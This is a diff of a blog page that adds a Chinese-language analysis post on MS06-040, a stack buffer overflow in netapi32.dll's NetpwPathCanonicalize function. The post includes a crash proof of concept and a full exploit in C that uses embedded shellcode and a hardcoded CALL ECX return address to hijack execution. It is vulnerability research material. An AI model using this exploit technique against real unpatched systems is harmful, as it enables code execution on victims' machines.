@@ -258,6 +258,177 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/ms06-040%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/" itemprop="url">ms06-040分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-16T22:31:58+08:00">
+                2020-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h1><p>漏洞点存在为netapi32.dll中的NetpwPathCanonicalize()导出函数，NetpwPathCanonicalize()是netapi32.dll的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int NetpwPathCanonicalize (</span><br><span class="line">uint16 path[ ], // [in] path name</span><br><span class="line">uint8 can_path[ ], // [out] canonicalized path</span><br><span class="line">uint32 maxbuf, // [in] max size of can_path</span><br><span class="line">uint16 prefix[ ], // [in] path prefix</span><br><span class="line">uint32* pathtype, // [in out] path type</span><br><span class="line">uint32 pathflags // [in] path flags, 0 or 1</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>这是一个Unicode字符串处理函数，大体功能是：如果prefix串非空，将prefix串与path串用‘\’相连，并复制到输出串can_path中，输出串的容量为maxbuf字节大小：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can_path=prefix+&quot;\&quot;+path</span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞的POC：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">long</span> *, <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">	<span class="keyword">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">	<span class="keyword">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">	<span class="keyword">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line"></span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC Trigger;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dll[ ] = <span class="string">"./netapi32.dll"</span>;</span><br><span class="line">	<span class="keyword">char</span> VulFunc[ ] = <span class="string">"NetpwPathCanonicalize"</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dll);</span><br><span class="line">	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="string">'b'</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">	</span><br><span class="line">	(Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">	FreeLibrary(LibHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC说明：导入存在漏洞的netapi32.dll中的NetpwPathCanonicalize函数，将path和prefix设置的很长以触发漏洞。</p>
+<p>运行后报错，使用OD attach：</p>
+<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg1.JPG" alt></p>
+<p>EIP被覆盖为”aaaa”的ascii：0x61616161，可见传入的参数溢出，覆盖了EIP。</p>
+<p>算出VA：0x75107B13</p>
+<p>在这里程序再一次crash：</p>
+<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg2.JPG" alt></p>
+<p>在这个wscat的拼接函数完成后存储返回地址的地方（0x12F6A8）被覆盖：</p>
+<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg3.JPG" alt></p>
+<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg4.JPG" alt></p>
+<p>根据ECX总是指向栈开始的buff可以构造如下shellcode：</p>
+<p>shellcode+patch+(jmp ecx)</p>
+<p>call ecx：0x796DB16C</p>
+<p>修改后POC：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">long</span> *, <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x74\x65\x73\x74\x68\x6D\x69\x78\x69\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">	<span class="keyword">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">	<span class="keyword">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">	<span class="keyword">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line"></span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC Trigger;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dll[ ] = <span class="string">"./netapi32.dll"</span>;</span><br><span class="line">	<span class="keyword">char</span> VulFunc[ ] = <span class="string">"NetpwPathCanonicalize"</span>;</span><br><span class="line">	</span><br><span class="line">	LibHandle = LoadLibrary(dll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__asm int 3;</span></span><br><span class="line"></span><br><span class="line">	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="string">'b'</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line"></span><br><span class="line">	path[<span class="number">0x318</span>]=<span class="number">0x6C</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">	path[<span class="number">0x319</span>]=<span class="number">0xB1</span>;</span><br><span class="line">	path[<span class="number">0x31A</span>]=<span class="number">0x6D</span>;</span><br><span class="line">	path[<span class="number">0x31B</span>]=<span class="number">0x79</span>;</span><br><span class="line"></span><br><span class="line">	(Trigger)(path,can_path,maxbuf,prefix ,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">	FreeLibrary(LibHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击成功：</p>
+<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/success1.JPG" alt></p>
+<p>静态分析结果：</p>
+<p><img src="/2020/04/16/ms06-040%E5%88%86%E6%9E%90/dbg5.JPG" alt></p>
+<p>按照ASCII字符开辟空间，按照Unicode字符来检查边界是漏洞的根本原因。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/%E7%94%9F%E8%BE%B0%E7%BA%B2%E6%A1%88/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1823,7 +1994,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
